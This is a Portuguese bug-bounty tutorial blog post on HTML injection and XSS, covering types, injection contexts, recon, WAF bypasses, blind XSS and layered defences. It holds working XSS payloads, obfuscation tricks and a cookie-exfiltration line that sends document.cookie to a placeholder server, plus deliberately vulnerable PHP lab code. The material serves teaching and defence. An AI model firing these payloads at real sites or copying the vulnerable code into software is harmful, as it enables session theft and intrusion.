---
title: "XSS e HTML Injection: do espelho ao controle do navegador"
description: "A versão definitiva e didática: do HTML Injection ao XSS, os três tipos, por que o payload muda por contexto, bypasses de WAF, blind XSS e defesa em camadas com CSP, encoding e DOMPurify."
author: matheus
date: 2026-04-06 19:59:00 -0300
categories: [Bug Bounty, Vulnerabilidades]
tags: ["XSS", "HTML Injection", "cross-site scripting", "reflected XSS", "stored XSS", "DOM XSS", "CSP", "WAF bypass", "DOMPurify", "OWASP", "bug bounty", "web security"]
image: /assets/img/covers/xss-html-injection.png
pin: false
comments: true
---
A versão definitiva e didática: do HTML Injection ao XSS, os três tipos, por que o payload muda por contexto, bypasses de WAF, blind XSS e defesa em camadas com CSP, encoding e DOMPurify.

{% raw %}

## O bug que faz o navegador da vítima trabalhar pra você

> Este blog já tocou em XSS antes. Aqui a gente **revisa de outra forma** — mais completa, mais didática, do zero ao avançado — pra você sair sabendo replicar em **qualquer** contexto, não só decorar um `<script>alert(1)</script>`.

Imagina um campo de busca que devolve "Você procurou por: **sapato**". Inocente, né? Aí você procura por `<b>sapato</b>` e a tela mostra a palavra **em negrito**. Esse pequeno detalhe — o site renderizou o seu HTML em vez de mostrar o texto literal — é o primeiro fio do novelo. Se ele aceita `<b>`, provavelmente aceita `<script>`. E se aceita `<script>`, o navegador da vítima passa a executar **o seu** JavaScript.

Isso é **Cross-Site Scripting (XSS)**, e ele está na lista do [OWASP Top 10 dentro de A03:2021 — Injection](https://owasp.org/Top10/A03_2021-Injection/). É uma das classes que mais aparece em bug bounty porque está em **todo lugar** onde uma aplicação reflete dado do usuário sem tratar. Neste post a gente vai do **HTML Injection** (o primo mais simples) até **roubo de sessão**, **blind XSS** e a defesa de verdade.

## O que é, na real (com analogia)

XSS é quando você consegue fazer a aplicação **entregar o seu JavaScript pro navegador de outra pessoa**, e esse navegador executa o script **como se fosse do site**. A palavra-chave é *contexto*: o navegador da vítima confia em tudo que vem daquele domínio (cookies, sessão, tokens) — e o seu script roda dentro dessa confiança.

> **Analogia:** o site é um carteiro que entrega bilhetes. Normalmente ele lê o seu bilhete e **copia o texto** num cartão ("o cliente disse: sapato"). No XSS, o carteiro pega o seu bilhete escrito em código e, em vez de copiar como texto, **executa as instruções**. Você manda "abra o cofre" e ele abre — porque confundiu *dado* (o que mostrar) com *instrução* (o que fazer).

Essa confusão entre **dado e código** é a raiz de toda injeção. No SQLi (que [revisamos em outro post da série](/posts/sql-injection/)) o dado vira comando **no banco**. No XSS, o dado vira comando **no navegador**.

### HTML Injection: o degrau antes do XSS

Antes de conseguir rodar script, muita vez você só consegue injetar **HTML** — uma tag `<b>`, um link `<a>`, uma imagem. Isso já é uma falha por si só, chamada **HTML Injection**:

- Você injeta `<a href="https://site-falso.com">Clique aqui</a>` num campo e ele vira **link clicável** na tela ou no e-mail de outra pessoa → vetor de **phishing/engenharia social**.
- Você injeta `<h1>` e quebra o layout da página → **defacement** leve (desfiguração visual da página).

HTML Injection é o **teste de fumaça** do XSS: se o HTML é interpretado, falta pouco pro JavaScript. Em programas reais, um HTML Injection simples (link refletido num e-mail, por exemplo) costuma pagar de **R$250 a R$500** (severidade baixa); o XSS pleno escala a partir daí. A diferença é só *quanto* da sua entrada o navegador interpreta.

## Por que importa (e quanto paga)

> 💡 **CSRF** (Cross-Site Request Forgery): força o navegador da vítima a enviar uma requisição autenticada sem ela saber. XSS pode encadear com CSRF.
{: .prompt-tip }

Quando o seu JavaScript roda no contexto do site, você herda os poderes da vítima:

- **Roubo de sessão/cookie** → assumir a conta (vira um [Account Takeover](/posts/account-takeover/)).
- **Keylogger** → capturar o que a vítima digita (senha, cartão).
- **Ações em nome da vítima** → encadear com **CSRF** (forçar a vítima a fazer uma requisição autenticada sem perceber) e fazer transferências, trocar e-mail, mudar senha.
- **Defacement / phishing interno** → injetar um formulário de login falso *na página verdadeira*.
- **Pivô pra outras falhas** → um **stored XSS** no mesmo host é, muitas vezes, o "meio de obtenção" que falta pra transformar um IDOR de token num report aceito (já vimos esse encaixe no post de [Broken Access Control](/posts/broken-access-control-idor-bola-bfla/)).

Faixa de bounty: de **R$150–500** (reflected de baixo impacto, exige interação) a **vários milhares** (stored XSS que atinge muitos usuários, ou que rouba sessão de admin). O que move o ponteiro é **quem é a vítima** e **quantos** dá pra afetar — exatamente o raciocínio de impacto do [post de severidade](/posts/severidade-impacto-triagem/).

> 📊 **Como o XSS pontua (CVSS).** Os exemplos oficiais da [FIRST.org](https://www.first.org/cvss/examples) ajudam a calibrar a severidade — repare que o **reflected** e o **stored** acabam parecidos no número, mas pelo motivo certo:
>
> | Tipo | CVSS v3.1 | CVSS v4.0 |
> |---|---|---|
> | **Reflected** (ex.: CVE-2022-24682) | `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` → **6.1 (Médio)** | `AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N` → **5.1 (Médio)** |
> | **Stored** (ex.: CVE-2020-0926) | `AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N` → **5.4 (Médio)** | `AV:N/AC:L/AT:N/PR:L/UI:P/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N` → **5.1 (Médio)** |
>
> A grande novidade do **v4.0** é o campo **UI (interação do usuário)**, que deixou de ser "sim/não" e virou três níveis: `UI:A` (**Active** — a vítima precisa de uma ação consciente, ex.: *clicar no link* → é o reflected) e `UI:P` (**Passive** — interação involuntária, a vítima só abre a página → é o stored). E o impacto agora cai em **SC/SI** (*Subsequent System*: o navegador da vítima), não no app vulnerável — exatamente a natureza do XSS. Esses são **scores-base de exemplos genéricos**; o seu sobe rápido conforme você prova roubo de sessão de admin ou alcance em massa (aí `SC`/`SI` viram `H`). Não cole o número de fórmula — calcule conforme o **seu** impacto demonstrado, como no [post de severidade](/posts/severidade-impacto-triagem/).

> ⚠️ **Cookie `HttpOnly` muda o jogo.** Se o cookie de sessão é `HttpOnly`, o `document.cookie` não enxerga ele — aí o roubo de cookie clássico não funciona. Mas XSS continua crítico: você ainda executa ações em nome da vítima (CSRF via fetch autenticado), faz keylogger e lê dados da tela. Não desista do impacto só porque o cookie está protegido.

## Como funciona por trás

O ciclo é sempre o mesmo: **entrada → reflexão/armazenamento → renderização sem tratamento → execução**.

Veja o backend vulnerável mais clássico do mundo (PHP, mas vale pra qualquer linguagem):

```php
// VULNERÁVEL — joga a entrada do usuário direto no HTML
$termo = $_GET['q'];
echo "<p>Você procurou por: $termo</p>";
```

Se a vítima abrir `https://alvo.com/busca?q=<script>alert(document.domain)</script>`, o HTML gerado vira:

```html
<p>Você procurou por: <script>alert(document.domain)</script></p>
```

O navegador **não sabe** que `<script>` veio de um atacante — pra ele é HTML legítimo do `alvo.com`. Resultado: o script roda. Trocamos `alert(1)` por `alert(document.domain)` de propósito: o `alert(1)` só prova "executou JS"; o `document.domain` prova **em qual origem** executou — evidência muito mais forte pro report.

> 💡 Em ambientes modernos, o Chrome (92+) bloqueia `alert()` dentro de iframes cross-origin. Por isso a [PortSwigger recomenda `print()`](https://portswigger.net/web-security/cross-site-scripting) como prova alternativa quando o `alert` "não dispara" e você desconfia que é por causa de iframe.

## Os três tipos (com analogia de cada)

| Tipo | Origem do payload | Onde mora o bug | Analogia |
|---|---|---|---|
| **Reflected** | Vem na **request atual** (URL, form) e volta na resposta | Servidor | Espelho: você fala e o eco volta na hora. Precisa **enviar o link** pra vítima |
| **Stored** | **Salvo no banco** e servido pra quem abrir a página | Servidor | Bilhete colado no mural: quem passar, lê. **Não precisa de link**, a vítima vem sozinha |
| **DOM-based** | A request normal, mas o **JS do front** trata a entrada | Cliente (navegador) | Telefone sem fio dentro da própria casa: o servidor nem viu o payload, foi o JavaScript que se atrapalhou |

As definições são as da [PortSwigger](https://portswigger.net/web-security/cross-site-scripting): **reflected** = "o script malicioso vem da request HTTP atual"; **stored** = "vem do banco de dados do site"; **DOM-based** = "a vulnerabilidade está no código client-side, não no server-side".

> 💡 **Reflected × Stored, na imagem que gruda:** o **Reflected** é entregar um **copo de água envenenado** na mão da vítima — ela precisa "beber" (clicar no seu link). O **Stored** é **envenenar a água da cidade**: você contamina a fonte e **qualquer um** que beber é atingido, sem precisar convencer ninguém. Por isso o Stored costuma valer mais: escala sozinho e dispensa engenharia social.

### Por que o DOM-based é diferente (e mais traiçoeiro)

No reflected/stored, o **servidor** monta o HTML errado. No DOM-based, o servidor pode mandar uma resposta perfeitamente segura — o estrago acontece **depois**, quando o JavaScript da página pega um dado de uma **fonte (source)** e joga num **destino perigoso (sink)**.

```javascript
// DOM XSS VULNERÁVEL — lê da URL (source) e escreve no HTML (sink)
const nome = new URLSearchParams(location.search).get('nome'); // source: location
document.getElementById('saudacao').innerHTML = 'Olá, ' + nome;  // sink: innerHTML
```

Abrindo `?nome=<img src=x onerror=alert(document.domain)>`, o `innerHTML` interpreta a tag e o `onerror` dispara. Repare: **o payload pode nem chegar ao servidor** se você usar o fragmento (`#`), porque o que vem depois do `#` não é enviado na request HTTP — só o navegador vê. Por isso DOM XSS muitas vezes passa batido por WAF e por log de servidor.

> 💡 **WAF** (Web Application Firewall): filtro na frente da aplicação que tenta barrar requisições maliciosas por padrões/assinaturas. Detalhe no [Glossário](/posts/fundamentos-web-hacking/).

Segundo o [OWASP DOM-based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html), os **sinks** mais perigosos são:

- **Renderizam HTML:** `innerHTML`, `outerHTML`, `document.write()`, `document.writeln()`
- **Executam código:** `eval()`, `setTimeout(string)`, `setInterval(string)`, `new Function()`
- **Atributos e navegação:** `setAttribute('onclick', ...)` (escreve handler de evento) e `location`/`location.href` (permite redirect ou execução via `javascript:` URI)

## Contextos de injeção: por que o payload muda (a parte que ninguém pode pular)

Esse é **o conceito** que separa quem decora payload de quem entende XSS. O mesmo dado, dependendo de **onde** ele cai no HTML, exige um payload diferente — porque o navegador tem regras de parsing diferentes em cada lugar. Vamos ver os quatro contextos principais.

### Contexto 1 — Entre tags HTML (`<p>AQUI</p>`)
É o mais simples. Você está no "corpo" do HTML, então pode abrir uma tag nova:

```html
<p>Você procurou por: <script>alert(document.domain)</script></p>
<p>Você procurou por: <img src=x onerror=alert(document.domain)></p>
```

### Contexto 2 — Dentro de um atributo (`<input value="AQUI">`)
Aqui você **não** está livre no HTML: está preso entre aspas de um atributo. Primeiro precisa **escapar do atributo** fechando as aspas e a tag:

```html
<!-- a aplicação monta: <input value="SUA_ENTRADA"> -->
"><img src=x onerror=alert(document.domain)>
<!-- vira: <input value=""><img src=x onerror=alert(document.domain)> -->
```

E se a aplicação **filtra `<` e `>`** mas deixa as aspas passarem? Você não consegue criar tag nova — mas pode injetar um **event handler no próprio atributo**, sem nenhuma tag (esse padrão real apareceu num refletido em página de login):

```html
<!-- entrada que não usa < nem > -->
" onfocus=alert(document.domain) autofocus="
<!-- vira: <input value="" onfocus=alert(document.domain) autofocus=""> -->
```

O `autofocus` força o campo a receber foco sozinho, o que dispara o `onfocus` **sem clique da vítima**. Sacou? O contexto "atributo" abriu uma porta que o contexto "corpo HTML" nem precisava.

### Contexto 3 — Dentro de um `<script>` (já estou no JavaScript)
Se a sua entrada cai **dentro** de um bloco `<script>`, você nem precisa de tag — já está em terreno JS. Aí o jogo é **quebrar a string** e injetar código:

```html
<script>
  var termo = "SUA_ENTRADA";   // a app coloca sua entrada aqui dentro
</script>
```

```javascript
// payload: fecha a string, executa, e comenta o resto pra não quebrar a sintaxe
";alert(document.domain)//
// resultado:  var termo = "";alert(document.domain)//";
```

### Contexto 4 — URL / `href` (o perigo do `javascript:`)
Quando sua entrada vira o destino de um link ou redirect, existe o esquema `javascript:`, que executa código ao ser navegado:

```html
<a href="SUA_ENTRADA">link</a>
<!-- payload: --> javascript:alert(document.domain)
```

> 💡 **A regra de ouro do contexto:** antes de escolher o payload, **olhe o código-fonte da resposta** e pergunte "onde exatamente a minha entrada caiu?". Corpo HTML? Atributo? Dentro de script? Atributo de URL? O payload **certo** é o que escapa **daquele** lugar específico. Decorar payload sem ler o contexto é chutar.

## Recon — como encontrar

XSS se acha caçando **todo ponto onde a sua entrada reaparece** na resposta (refletida) ou em outra tela (stored). Onde olhar:

- **Parâmetros refletidos:** busca, filtros, mensagens de erro, `?q=`, `?search=`, `?name=`, `?redirect=`, `?lang=`. Um padrão de campo que funciona muito é fuzzar vários nomes comuns de uma vez (`s`, `search`, `id`, `query`, `keyword`, `name`, `q`, `url`, `view`, `cat`).
- **Campos persistidos (stored):** nome/sobrenome de perfil, comentários, nome de arquivo no upload, campos de formulário de contato, descrição de produto — qualquer coisa que **outra pessoa vai ver depois**.
- **E-mails e PDFs gerados pela app:** o e-mail de reset de senha, a confirmação de pedido. Se o seu "nome" entra HTML ali, é HTML Injection (e às vezes XSS no cliente de e-mail).
- **DOM:** abra o DevTools → aba **Sources**, dê `Ctrl+Shift+F` e procure pelos sinks (`innerHTML`, `document.write`, `eval`, `location`). Veja se algum recebe dado de `location`, `document.referrer` ou `postMessage`.

```bash
# Achar parâmetros refletidos em URLs históricas (gau/httpx já apresentados no post 01-recon)
echo alvo.com | gau | grep '=' | qsreplace '"><svg onload=confirm(1)>' | \
  httpx -silent -mc 200 -ms 'svg onload=confirm(1)'   # casa quando o payload volta CRU na resposta
```

> A ideia acima: `qsreplace` troca o valor de **todos** os parâmetros pelo payload, e o `httpx` marca (`-ms`, *match string*) as respostas que devolveram o payload **sem escapar** — esses são os candidatos a refletido. (`gau`, `httpx` e `qsreplace` foram apresentados no [post de Recon](/posts/recon-discovery/).)

```text
# Dork pra achar parâmetros refletidos indexados
site:alvo.com inurl:search | inurl:q= | inurl:query=
```

> 💡 Comece com um **marcador único e inofensivo**: `xsstest9173`. Mande, depois ache `xsstest9173` na resposta com `Ctrl+F`. **Onde** ele aparece (corpo? atributo? script?) e **como** (cru? entitizado?) te diz o contexto e se vale tentar payload.

## Exploração passo a passo (do básico ao avançado)

### Nível 0 — HTML Injection (teste de fumaça)
Injete `<b>xsstest</b>` ou `<h1>xsstest</h1>`. Se a tela mostra **negrito/título** em vez do texto literal, o HTML é interpretado → siga pro script.

### Nível 1 — Reflected, contexto corpo HTML
```http
GET /busca?q=<svg/onload=alert(document.domain)> HTTP/2
Host: alvo.com
```
`<svg onload=...>` é ótimo porque dispara **sozinho** (sem precisar de imagem quebrada como o `<img onerror>`). A barra `<svg/onload>` evita o espaço, útil quando o filtro corta espaços.

### Nível 2 — Stored, contexto perfil
Coloca o payload no **nome do perfil** e visita a página como **outra conta**. Se disparar pra todo mundo que abre, é **stored** — mais grave que reflected porque não exige link.

```http
PUT /api/perfil HTTP/2
Host: alvo.com
Content-Type: application/json
Authorization: Bearer <token>

{"nome": "<img src=x onerror=alert(document.domain)>"}   # <- renderiza pra quem vê o perfil
```

> Dica de report (vinda do campo): se achar XSS em **dois campos distintos** da mesma página (ex.: `nome` e `sobrenome`), reporte **separadamente** — são dois sinks diferentes, dois reports.

### Nível 3 — DOM-based
Ache o sink no JS e alimente a source. Exemplo com `location.hash` (que **não** vai pro servidor):

```
https://alvo.com/pagina#<img src=x onerror=alert(document.domain)>
```

### Nível 4 — Bypasses (quando tem filtro/WAF no caminho)

A tabela abaixo é o seu arsenal quando o payload óbvio é bloqueado. **Cada técnica ataca uma suposição do filtro.**

| Técnica | Payload | Por que funciona |
|---|---|---|
| **Sem `<script>`** (event handler) | `<img src=x onerror=alert(1)>` · `<svg onload=alert(1)>` · `<body onload=alert(1)>` | Filtro que só bloqueia a palavra `script` ignora handlers |
| **Case mixing** | `<ScRiPt>alert(1)</sCrIpT>` | HTML é case-insensitive; filtro que compara `script` minúsculo passa batido |
| **Encoding HTML** | `&lt;` vira `<` ao renderizar | Se o filtro decodifica **depois** de checar, você passa |
| **Encoding URL / duplo** | `%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E` ou duplo `%253C` | A app decodifica em camadas; o duplo-encode "atravessa" um decode |
| **Comentário no meio** | `<scr<!---->ipt>` | Quebra a assinatura textual sem quebrar o parsing do navegador |
| **`String.fromCharCode`** | `String.fromCharCode(97,108,101,114,116)` → `"alert"` | Reconstrói a palavra proibida em runtime, sem ela aparecer literal |
| **`window[a]`** | `var a=String.fromCharCode(...); window[a](1)` | Chama `alert` sem digitar `alert` — evita a blacklist da função |
| **`eval(atob(...))`** | `eval(atob('YWxlcnQoMSk='))` | Esconde o payload inteiro em Base64; o WAF vê só uma string opaca |

O combo `String.fromCharCode` + `window[a]` é um padrão clássico de **bypass de WAF** — variações dessa obfuscação já figuram em writeups públicos de bypass de WAFs comerciais (Imperva entre eles). A lógica: o WAF tem uma blacklist com `alert`, `<script>`, etc. Você **nunca escreve essas strings** — monta tudo em runtime:

```javascript
// nenhuma das palavras "alert" ou "script" aparece no texto enviado
var a = String.fromCharCode(97,108,101,114,116); // "alert"
window[a]("XSS");                                  // window["alert"]("XSS")
```

> ⚠️ Bypass é **caso a caso**. Não existe "payload universal de WAF". A receita é: descobrir **o que** o filtro corta (mande pedaços e veja o que sobra na resposta) e então escolher a técnica que contorna *aquela* regra específica.

### Nível 5 — Blind XSS (você não vê o disparo)

Às vezes o seu payload é salvo num lugar que **só um funcionário vê depois** — um painel de admin, um sistema de tickets, um CRM interno. Você nunca vê o `alert`. Isso é **blind XSS**, e a única forma de saber se disparou é o payload **te avisar de fora**:

```html
<script src="https://SEU-ID.xss.report"></script>
```

Ferramentas como **XSS Hunter** (e o self-hosted [xsshunter-express](https://github.com/mandatoryprogrammer/xsshunter-express)) ou o **Burp Collaborator** te entregam um payload que, ao executar, faz um *callback* pro seu servidor com: URL onde disparou, cookies (se não `HttpOnly`), user-agent e até screenshot do DOM. É assim que você prova que o seu comentário "explodiu" no painel interno da empresa — provavelmente o XSS mais valioso, porque atinge **operadores privilegiados**.

### Nível 6 — Vetores avançados (2026)

Quando o básico não passa, vale conhecer os caminhos modernos. O mais importante hoje:

**Prototype pollution → DOM XSS.** Em apps JavaScript, se você consegue poluir o `Object.prototype` (injetar uma propriedade que **todo** objeto passa a herdar), dá pra fazer um *gadget* do próprio código client-side cair num sink perigoso (`innerHTML`, `src` de `<script>`) e virar XSS — mesmo sem um `<script>` óbvio. É a ponte entre duas classes e um dos vetores que mais cresce. Tem capítulo dedicado: [Prototype Pollution](/posts/prototype-pollution/).

> ⚡ **Outros bypasses pra ter no radar (não precisa decorar — só saiba que existem):**
> - **CSP bypass:** abusar de **JSONP/AngularJS** num host que o CSP confia, injetar uma `<base>`, ou — se a app reflete a própria policy — **injetar diretiva** que afrouxa o CSP. (Os furos clássicos de CSP estão na seção de Defesa.)
> - **mXSS (mutation XSS):** HTML que parece "limpo" **muda de significado** quando o navegador re-parseia (ex.: ao cair no `innerHTML`) — fura até sanitizador (o DOMPurify **desatualizado** já teve bypass por mXSS; mantenha a lib atual).
> - **Charset confusion:** se a resposta não fixa `charset=UTF-8`, dá pra contrabandear script via **UTF-7** (navegadores antigos).
> - **`data:` / `javascript:` URI:** em redirect/`window.open`, um `data:text/html;base64,...` executa no contexto certo.
> - **JS hoisting:** declarar função/variável "içada" pra contornar a ordem que o filtro espera.
>
> Cada técnica ataca uma suposição específica — aprofunde no [cheat sheet de XSS da PortSwigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) quando bater na parede.

## Caso real-fictício: do refletido ao roubo de sessão

> Cenário **fictício, baseado em padrões reais** de bug bounty (anonimizado).

Você testa `app.exemplo.com`. Na busca, manda o marcador `xsstest9173` e acha ele na resposta dentro de um atributo:

```html
<input type="text" name="q" value="xsstest9173">
```

**Passo 1 — Identificar o contexto.** Caiu num `value="..."`. Contexto **atributo**. Preciso fechar a aspa e a tag.

**Passo 2 — Confirmar.** No Burp Repeater:

```http
GET /busca?q="><svg/onload=alert(document.domain)> HTTP/2
Host: app.exemplo.com
```

```http
HTTP/2 200 OK
Content-Type: text/html

<input type="text" name="q" value=""><svg/onload=alert(document.domain)>
```

O `<svg>` escapou do atributo e o `onload` dispara. **Reflected XSS confirmado.**

**O que a tela mostraria:** o navegador abrindo o popup com `app.exemplo.com` — prova de que o script roda **na origem do alvo**, não numa página falsa.

**Passo 3 — Mostrar impacto real.** Em vez do `alert`, um payload que **exfiltra a sessão** (se o cookie não for `HttpOnly`):

```html
"><svg/onload="fetch('https://SEU-SERVIDOR/c?'+document.cookie)">
```

Esse `fetch` manda o `document.cookie` da vítima pro seu servidor. Você monta a PoC (Proof of Concept — a prova reproduzível de que o bug existe) com a URL maliciosa (`/busca?q=...`), envia pra **sua própria conta de teste**, e demonstra o cookie chegando no seu log. **Nunca** mire numa vítima real — a prova é o mecanismo, não a pessoa.

**Passo 4 — Report.** Título: `[Reflected XSS] Execução de JS via parâmetro q na busca (escape de contexto de atributo)`. Resumo focado no negócio: *"qualquer usuário que abra um link manipulado executa JS no contexto de app.exemplo.com, permitindo roubo de sessão e ações em nome da vítima"*. Inclua: URL da PoC, request/response do Burp, print do popup e (se demonstrou) o cookie chegando no seu servidor. Severidade conforme impacto e interação exigida — veja como estruturar isso em [Como escrever um report que paga](/posts/como-escrever-report-que-paga/).

> 🔗 **O encaixe que vale ouro: XSS como "meio de obtenção" pra fechar um ATO.** Lembra do [post de Broken Access Control](/posts/broken-access-control-idor-bola-bfla/), onde a app autenticava só pelo **JWT** e a gente conseguia ler dados de outra conta trocando o token — mas o triager respondia *"e como você obteria o token de outra pessoa na vida real?"*? O **stored XSS no mesmo host** é a resposta. Se o seu script roda no contexto de `app.exemplo.com` e o token não é `HttpOnly`, ele exfiltra o JWT da vítima; com esse token você reproduz o IDOR/[Account Takeover](/posts/account-takeover/) **de ponta a ponta**. É a diferença entre um IDOR teórico (impacto fraco) e um **ATO comprovado** (impacto alto). Sempre que achar XSS, pergunte: *"o que eu consigo roubar com isso que destrava outra falha?"*.

## Mão na massa: monte um lab e capture flags reais

Teoria sem dedo no teclado não fixa. Comece com um **lab local** de 30 segundos — um `lab-xss.php` que reflete o input **sem** tratar:

```php
<?php
// lab-xss.php — VULNERÁVEL DE PROPÓSITO (rode só local)
if (!empty($_GET['q'])) {
    echo "Você pesquisou por: " . $_GET['q'];   // <- sem encoding = XSS
}
?>
<form><input name="q" placeholder="Pesquisar..."><button>Buscar</button></form>
```

Abra `http://localhost:8888/lab-xss.php?q=<script>alert(document.domain)</script>` → o popup confirma. Agora **conserte** trocando a linha por `htmlspecialchars($_GET['q'], ENT_QUOTES, 'UTF-8')` e veja o payload virar texto. Esse ciclo **quebra → conserta** é o que fixa de verdade.

Depois, vá pras **máquinas de XSS da [HackingClub](https://hackingclub.com)** (ou PortSwigger Academy / DVWA / TryHackMe — lista logo abaixo). Lá os três tipos aparecem num alvo real e autorizado:

- **Reflected:** um formulário de contato reflete `?name=` na resposta → `?name=<script>alert(document.domain)</script>` dispara e libera a flag (`CS{XSS_R3fl3ct3d_34sy}`).
- **Stored:** um comment box salva e re-exibe → o `<script>` só dispara **ao recarregar** (veio do backend), confirmando o Stored (`CS{XSS_St0r3d_l1k3_4_b0ss}`).
- **DOM-based:** uma busca escreve em `innerHTML` via `URLSearchParams` sem sanitizar → `?search=<img src=x onerror=alert(document.domain)>` dispara **sem o payload tocar o servidor** (`CS{XSS_D0M_B4s3d}`).

## Defesa em camadas

XSS não morre com **um** controle. A correção real combina várias camadas — e a principal é uma só: **trate dado como dado, nunca como código.**

### 1. Output encoding **por contexto** (a defesa nº 1)
O [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) é explícito: **escape na saída, conforme o contexto**. No corpo HTML, faça **HTML entity encoding**:

| Caractere | Vira |
|---|---|
| `&` | `&amp;` |
| `<` | `&lt;` |
| `>` | `&gt;` |
| `"` | `&quot;` |
| `'` | `&#x27;` |

```php
// CORRETO — entidade HTML, o navegador mostra como texto e não executa
echo "<p>Você procurou por: " . htmlspecialchars($termo, ENT_QUOTES, 'UTF-8') . "</p>";
```

⚠️ **Encoding de HTML não basta dentro de `<script>` ou de atributo de URL.** Cada contexto tem o seu encoding: atributo → `&#xHH;`; dentro de JS → `\uXXXX`; URL → percent-encoding. Usar o encoding **errado** abre brecha (o próprio OWASP avisa: "usar o método de encoding errado pode introduzir fraquezas").

> 🪤 **A defesa que parece certa mas falha: `htmlspecialchars` sem `ENT_QUOTES`.** Os dois argumentos extras acima não são enfeite. Até o **PHP 8.0**, o default de `htmlspecialchars($x)` era `ENT_COMPAT` — escapa a aspa **dupla** (`"`) mas **deixa a aspa simples (`'`) passar** (só virou `ENT_QUOTES` por padrão no PHP 8.1). Então o dev que "escapou tudo" com `htmlspecialchars($q)` num atributo de **aspas simples** continua furado:
> ```php
> // VULNERÁVEL — o default antigo não escapa a aspa simples
> echo "<input value='" . htmlspecialchars($q) . "'>";
> ```
> Entrada `' autofocus onfocus=alert(document.domain) x='` → vira `<input value='' autofocus onfocus=alert(document.domain) x=''>` e dispara. **O correto:** sempre `htmlspecialchars($q, ENT_QUOTES, 'UTF-8')` (ou `ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML5`) **com charset explícito** — e, de preferência, aspas duplas no atributo. A regra: encoding só defende se cobrir **o delimitador do seu contexto**. ([manual do PHP](https://www.php.net/manual/en/function.htmlspecialchars.php))

### 2. Use os "sinks seguros" no front (contra DOM XSS)
A regra mais fundamental do [DOM XSS Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html): popular o DOM com `textContent`, **não** `innerHTML`.

```javascript
// ERRADO — innerHTML interpreta HTML, executa script
el.innerHTML = 'Olá, ' + nome;

// CORRETO — textContent trata como TEXTO, impossível executar código
el.textContent = 'Olá, ' + nome;
```

Por que funciona: `innerHTML` faz o navegador **parsear o conteúdo como HTML** (e disparar handlers); `textContent` só escreve **texto** — o navegador nunca interpreta como markup. Mesma lógica vale pra fugir de `eval`, `document.write` e `setTimeout(string)`.

### 3. Precisa aceitar HTML do usuário? **Sanitize com DOMPurify**

> 💡 **WYSIWYG** (What You See Is What You Get): editor visual que gera HTML rico. Aumenta a superfície de XSS se a sanitização for fraca.
{: .prompt-tip }

Se o produto exige HTML rico (um editor WYSIWYG, por exemplo), não dá pra escapar tudo. Aí use uma lib de sanitização madura — **nunca** regex caseira:

```javascript
import DOMPurify from 'dompurify';
// allowlist: só deixa passar o que você explicitamente permite
el.innerHTML = DOMPurify.sanitize(htmlDoUsuario, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'li'],
  ALLOWED_ATTR: ['href']
}); // remove <script>, onerror, javascript: etc.
```

Por que DOMPurify e **não** regex caseira: o [OWASP recomenda sanitização por allowlist](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) (libera só o que você quer) e **nunca denylist** ("removo `<script>`"). Atacante acha bypass de denylist mais rápido do que você corrige — é a mesma blacklist que furamos lá no Nível 4. O DOMPurify é mantido pela cure53, entende parsing real de HTML/SVG/MathML e já se ajusta a *mutation XSS* (mXSS) que regex jamais pegaria.

### 4. Confie no auto-escape do framework (mas conheça os furos)
React, Angular, Vue e templates como Twig/Jinja **escapam por padrão**. O perigo está nas válvulas de escape: `dangerouslySetInnerHTML` (React), `[innerHTML]` (Angular), `v-html` (Vue) — usar isso com dado do usuário **desliga** a proteção.

### 5. CSP como rede de segurança (defesa em profundidade)
A [CSP](https://portswigger.net/web-security/cross-site-scripting/content-security-policy) é um header que diz ao navegador **de onde** script pode rodar. Mesmo que um XSS passe, o CSP pode **impedir a execução**. Use **nonce** (valor aleatório por requisição):

```http
Content-Security-Policy: script-src 'nonce-a1b2c3d4e5f6'; object-src 'none'; base-uri 'none'
```

```html
<!-- só executa o script que tiver o nonce certo daquele page load -->
<script nonce="a1b2c3d4e5f6">/* código confiável */</script>
```

O `<script>` injetado pelo atacante **não tem o nonce** (que é aleatório e imprevisível a cada carga) → o navegador recusa. Regras de ouro do CSP: o nonce tem que ser **gerado de forma segura a cada page load e não ser adivinhável**; e **nunca** use `'unsafe-inline'` no `script-src` (isso anula a proteção). O próprio OWASP frisa: CSP é **defesa em profundidade**, não a defesa primária — encoding continua sendo o pilar.

> ⚠️ **CSP não é à prova de balas — e o caçador precisa saber por quê.** Mesmo um nonce bem-feito tem furos clássicos (todos com lab na [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/content-security-policy)):
> - **`'unsafe-inline'` no `script-src`** → CSP basicamente desligado, qualquer inline roda.
> - **Domínio confiável que hospeda JSONP** → se o CSP libera um host (ex.: um CDN do Google) que tem endpoint **JSONP** com `callback=`, você injeta `<script src="https://host-confiavel/...jsonp?callback=alert(document.domain)">` e o código roda **dentro** da policy. Por isso `script-src` deve listar só hosts sem JSONP.
> - **`base-uri` ausente** → o atacante injeta uma tag `<base href="//servidor-dele">` e os scripts de **caminho relativo** da página passam a carregar do servidor dele. Sempre defina `base-uri 'none'` (ou `'self'`).
> - **Dangling markup** → quando não dá pra executar JS, dá pra **exfiltrar** conteúdo da página (um token CSRF, por exemplo) com markup "pendurado" tipo `<img src='//servidor-dele?` que "engole" o HTML seguinte até a próxima aspa. A defesa contra isso é `base-uri` definido e não depender só do CSP.
>
> Resumindo: CSP **bloqueia** inline sem nonce e fontes não listadas, mas **não bloqueia** abuso de host confiável (JSONP), `base` injection nem exfiltração por dangling markup. É camada extra, não a defesa.

### 6. Cookies blindados
```
Set-Cookie: sessao=...; HttpOnly; Secure; SameSite=Lax
```
